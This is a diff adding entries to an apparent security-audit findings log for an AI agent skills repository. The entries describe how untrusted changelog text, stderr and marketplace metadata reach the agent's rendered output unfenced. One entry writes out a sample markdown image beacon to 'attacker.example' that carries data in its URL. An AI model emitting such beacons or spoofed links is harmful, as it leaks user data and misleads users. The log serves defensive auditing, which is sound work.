@@ -3146,3 +3146,37 @@ location: plugins/ievo/skills/version/SKILL.md (Step 4 "Fetch and window the cha
 ```
 
 Directly re-read this run: Step 4 fetches `CHANGELOG.md` from `main` via unauthenticated `curl` and its own "Robustness notes" instruct `Present the selected sections verbatim and in file order... Do not summarise or rewrite them`; Step 5's render templates splice `<verbatim changelog body for vX.Y.Z>` straight into the assistant's printed output. A full-file grep (`grep -in "containment\|backtick\|fenc" plugins/ievo/skills/version/SKILL.md`, 189 lines total) returns zero matches — confirming no excerpt-containment treatment exists anywhere in this file, unlike every sibling skill in `plugins/ievo/skills/` that touches externally-sourced text. `/ievo:version` is a routine, frequently-invoked, ostensibly read-only command ("am I up to date"), making this a broad-reach vector: any content landing in `ievo-ai/skills`'s public `CHANGELOG.md` on `main` (compromised maintainer credential, a merged-then-reverted malicious PR, or an unsanitized auto-generated changelog entry quoting untrusted PR text) that carries a crafted `![...](...)`/`[...](...)` renders live — with a tracking-beacon or spoofed-link effect — the instant any user behind latest asks "am I up to date".
+
+## S-2026-08-26-001 — repo-indexer.md's Step 4 failure-handling echoes stderr with no excerpt containment
+
+```yaml
+id: S-2026-08-26-001
+discovered_at: 2026-08-26T00:00:00Z
+run_id: 32940276912
+target_repo: ievo-ai/skills
+title: agents/repo-indexer.md Step 4 "Other nonzero" branch returns the raw stderr first line verbatim with no backtick-fencing, unlike every sibling agent's excerpt-containment pattern
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/659
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/repo-indexer.md:102
+```
+
+Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, agents+commands dispatch): `repo-indexer.md` Step 4's "Other nonzero" branch instructs `return FAILED: <owner>/<repo> — <stderr first line>` and "Return this line verbatim as your only response. No commentary, no markdown." — the stderr comes from `scan_repo.mjs`'s `mainSafe()` catch-all, which prints `` fatal: ${stripForDisplay(err.message)} ``; `stripForDisplay()`'s own definition (confirmed by direct re-read) strips only `CONTROL_CHAR_RE`'s class plus CR/LF, never Markdown-active bytes (`[`, `]`, `(`, `)`, `!`, `<`, `>`). A crafted file/directory name in an attacker-published repo (git tree entries permit any byte except NUL) reaching an unguarded `fs` call during enumeration — e.g. `listDirSorted()`'s bare `readdirSync` — can embed a live `![beacon](...)`/`[spoofed link](...)` into the sub-agent's entire returned output, with zero fencing at the one call site (`repo-indexer.md`) that differs from every sibling agent's (`deep-reviewer.md`, `evolution.md`, `security-auditor.md`, `review-retrospective.md`, `vuln-scanner.md`) established "Excerpt containment" convention. Distinct from already-issued `S-2026-07-10-001`/#361 (same file, different call site — Step 1's Bash command-injection via unvalidated `<owner>/<repo>`, not Step 4's Markdown-rendering gap).
+
+## S-2026-08-26-002 — init/SKILL.md's Step 7b interview + log-format.md tables render untrusted candidate metadata with no excerpt containment
+
+```yaml
+id: S-2026-08-26-002
+discovered_at: 2026-08-26T00:00:00Z
+run_id: 32940276912
+target_repo: ievo-ai/skills
+title: init/SKILL.md Step 7b's four AskUserQuestion templates and init/references/log-format.md's Section 5/6/6b/7b candidate tables render untrusted skill/agent/plugin registry name/description fields verbatim, unlike inspect/SKILL.md and overlay-status/SKILL.md's established excerpt-containment pattern
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/660
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/skills/init/SKILL.md:690-735; plugins/ievo/skills/init/references/log-format.md:98-215
+```
+
+Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, full 22-file skills-module dispatch): `discover.mjs`'s `skill.name`/`description` fields are validated only by `typeof === "string"` (per `feedback/SKILL.md` Step 3.85's own existing note — "no agentskills.io `[a-z0-9-]+` allowlist is applied at fetch time"), so a malicious public skills.sh/Codex-marketplace listing can set either field to `![beacon](https://attacker.example/x.png?d=<data>)` or a spoofed link. `init/SKILL.md` Step 7b's four `AskUserQuestion` templates (type=skill/agent/plugin×2, lines 690-735) interpolate this content verbatim into `Question`/`description` strings with no excerpt-containment instruction, and `log-format.md`'s Section 5/6/6b/7b tables write the same fields verbatim into the persistent, plain-Markdown `.ievo/log/init-*.md`. `feedback/SKILL.md` Step 3.85 already treats this exact table's content as untrusted but only fences it at issue-attach time, not at write/display time. Confirmed by full-file grep for "containment"/"backtick"/"fenc" across both files — zero matches, unlike `inspect/SKILL.md`/`overlay-status/SKILL.md`, which both apply the established backtick-run-sizing pattern to comparable untrusted rendered fields.
